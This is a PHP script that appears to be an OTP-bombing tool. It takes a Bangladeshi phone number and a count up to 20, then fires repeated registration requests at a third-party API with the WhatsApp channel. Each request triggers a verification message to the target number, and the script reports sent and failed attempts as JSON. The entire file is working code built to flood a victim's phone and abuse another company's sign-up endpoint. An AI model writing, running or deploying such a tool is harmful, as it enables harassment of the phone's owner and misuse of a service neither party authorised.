<?php
header('Content-Type: application/json');

$number = isset($_POST['number']) ? $_POST['number'] : (isset($_GET['number']) ? $_GET['number'] : null);
$amount = isset($_POST['amount']) ? (int)$_POST['amount'] : (isset($_GET['amount']) ? (int)$_GET['amount'] : null);

if (!$number || !preg_match('/^01\d{9}$/', $number)) {
    echo json_encode(['success' => false, 'message' => 'Invalid number. Must be 11 digits and start with 01.']);
    exit;
}

if (!$amount || $amount < 1 || $amount > 20) {
    echo json_encode(['success' => false, 'message' => 'Amount must be between 1 and 20.']);
    exit;
}

$results = [
    'sent' => 0,
    'failed' => 0,
    'remaining' => $amount,
    'details' => []
];

for ($i = 0; $i < $amount; $i++) {
    try {
        $url = 'https://b08.abcd43.com/api/auth/registerNumber';
        $data = [
            'countryCode' => '+880',
            'mobileNumber' => substr($number, 1),
            'promoCode' => '',
            'atag' => '',
            'clickId' => '',
            'userAgent' => $_SERVER['HTTP_USER_AGENT'] ?? 'API Request',
            'fbp' => '',
            'fbc' => '',
            'channel' => 'WHATSAPP'
        ];

        $options = [
            'http' => [
                'header' => "Content-type: application/json\r\n",
                'method' => 'POST',
                'content' => json_encode($data),
            ],
        ];

        $context = stream_context_create($options);
        $response = file_get_contents($url, false, $context);

        if ($response !== false) {
            $results['sent']++;
            $results['details'][] = ['attempt' => $i+1, 'status' => 'success'];
        } else {
            $results['failed']++;
            $results['details'][] = ['attempt' => $i+1, 'status' => 'failed'];
        }
    } catch (Exception $e) {
        $results['failed']++;
        $results['details'][] = ['attempt' => $i+1, 'status' => 'error', 'message' => $e->getMessage()];
    }

    $results['remaining']--;
}

echo json_encode([
    'success' => true,
    'message' => 'Processing completed',
    'results' => $results
]);
?>
